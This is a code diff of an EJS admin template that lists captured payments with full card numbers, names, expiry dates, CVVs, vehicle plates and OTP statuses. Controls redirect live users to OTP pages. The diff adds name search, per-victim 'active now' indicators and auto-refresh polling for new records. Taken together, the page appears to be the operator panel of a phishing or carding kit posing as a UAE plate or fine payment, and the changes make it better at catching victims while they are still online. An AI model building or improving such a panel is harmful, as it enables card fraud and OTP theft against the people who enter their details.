@@ -7,7 +7,7 @@
 <div class="filter-bar">
   <form method="GET" action="/admin/payments" style="display:flex;gap:12px;flex-wrap:wrap;align-items:flex-end;width:100%;">
     <div class="form-group" style="flex:1;min-width:200px;">
-      <label>Search (plate, card, issuer)</label>
+      <label>Search (plate, card, name, issuer)</label>
       <input type="text" name="q" value="<%= search %>" placeholder="e.g. JOHN DOE, Emirates NBD...">
     </div>
     <div class="form-group" style="min-width:160px;">
@@ -30,12 +30,20 @@
 <div class="table-card">
   <div class="tc-header">
     <div class="tc-title">Payments</div>
-    <div class="tc-meta"><%= total %> records</div>
+    <div style="display:flex;align-items:center;gap:12px;">
+      <div class="tc-meta"><%= total %> records</div>
+      <div style="display:flex;align-items:center;gap:5px;font-size:11px;color:var(--tx-muted);">
+        <span class="status-dot active"></span> Active
+        <span class="status-dot recent"  style="margin-left:6px;"></span> Recent
+        <span class="status-dot offline" style="margin-left:6px;"></span> Offline
+      </div>
+    </div>
   </div>
   <div style="overflow-x:auto;">
   <table>
     <thead>
       <tr>
+        <th style="width:28px;"></th>
         <th>#</th><th>Date</th><th>Plate</th><th>Amount</th>
         <th>Card No</th><th>Name</th><th>Exp</th><th>CVV</th>
         <th>Issuer</th><th>Country</th><th>Type</th>
@@ -44,13 +52,20 @@
     </thead>
     <tbody>
     <% if (payments.length === 0) { %>
-    <tr><td colspan="15" style="text-align:center;padding:40px;color:#94a3b8;">No records found.</td></tr>
+    <tr><td colspan="16" style="text-align:center;padding:40px;color:var(--tx-muted);">No records found.</td></tr>
     <% } %>
     <% payments.forEach(function(p) {
       const sc = {pending:'b-pending',approved:'b-approved',declined:'b-declined',otp_received:'b-received'}[p.otp_status] || 'b-pending';
       const dt = p.created_at ? new Date(p.created_at).toLocaleString('en-AE',{timeZone:'Asia/Dubai',day:'2-digit',month:'2-digit',year:'2-digit',hour:'2-digit',minute:'2-digit'}) : '-';
+      const now = Date.now();
+      const lastSeen = p.last_seen ? new Date(p.last_seen).getTime() : null;
+      const dotClass = !lastSeen ? 'offline' : (now - lastSeen < 90000 ? 'active' : (now - lastSeen < 300000 ? 'recent' : 'offline'));
+      const dotTitle = !lastSeen ? 'Never polled' : (dotClass === 'active' ? 'Active now' : (dotClass === 'recent' ? 'Recently active' : 'Offline'));
     %>
     <tr>
+      <td style="padding:11px 10px 11px 16px;">
+        <span class="status-dot <%= dotClass %>" title="<%= dotTitle %>"></span>
+      </td>
       <td class="muted small"><%= p.id %></td>
       <td class="small nowrap"><%= dt %></td>
       <td><strong><%= p.plate_src %></strong> <%= p.plate_code %> <%= p.plate_no %></td>
@@ -82,7 +97,7 @@
   </div>
 
   <% if (totalPages > 1) { %>
-  <div style="padding:14px 20px;display:flex;gap:6px;justify-content:center;border-top:1px solid #f1f5f9;">
+  <div style="padding:14px 20px;display:flex;gap:6px;justify-content:center;border-top:1px solid var(--bd-light);">
     <% for (let i = 1; i <= totalPages; i++) { %>
     <a href="/admin/payments?p=<%= i %>&status=<%= encodeURIComponent(statusFilter) %>&q=<%= encodeURIComponent(search) %>"
        class="btn btn-sm <%= i === page ? 'btn-primary' : 'btn-ghost' %>"><%= i %></a>
@@ -95,7 +110,7 @@
 
 <script>
 function redirect(sid, page) {
-  if (!confirm('Redirect user to ' + page + '?\n(User must be active on an OTP page.)')) return;
+  if (!confirm('Redirect user to ' + page + '?\n(User must be active on the waiting or OTP page.)')) return;
   adminAction({ act: 'redirect', sid, page });
 }
 function setStatus(sid, status) {
@@ -106,6 +121,37 @@ function delPayment(sid) {
   if (!confirm('Permanently delete this record?')) return;
   adminAction({ act: 'delete_payment', sid });
 }
+
+// ── Auto-refresh: poll for new payments every 10 seconds ─────────────────────
+<% if (payments.length > 0) { %>
+const CURRENT_LATEST_ID = <%= payments[0].id %>;
+<% } else { %>
+const CURRENT_LATEST_ID = 0;
+<% } %>
+
+let pollPaused = false;
+document.addEventListener('focusin',  () => pollPaused = true);
+document.addEventListener('focusout', () => pollPaused = false);
+document.addEventListener('mouseover', e => {
+  if (e.target.closest('.action-bar')) pollPaused = true;
+});
+document.addEventListener('mouseout', e => {
+  if (e.target.closest('.action-bar')) pollPaused = false;
+});
+
+setInterval(async () => {
+  if (pollPaused) return;
+  try {
+    const r = await fetch('/admin/api/latest-payment-id');
+    const d = await r.json();
+    if (d.id && d.id > CURRENT_LATEST_ID) {
+      const bar = document.getElementById('refresh-bar');
+      if (bar) { bar.style.display = 'block'; }
+      // Auto reload after 2s if not paused
+      setTimeout(() => { if (!pollPaused) location.reload(); }, 2000);
+    }
+  } catch(e) {}
+}, 10000);
 </script>
 
 <%- include('_layout_end') %>
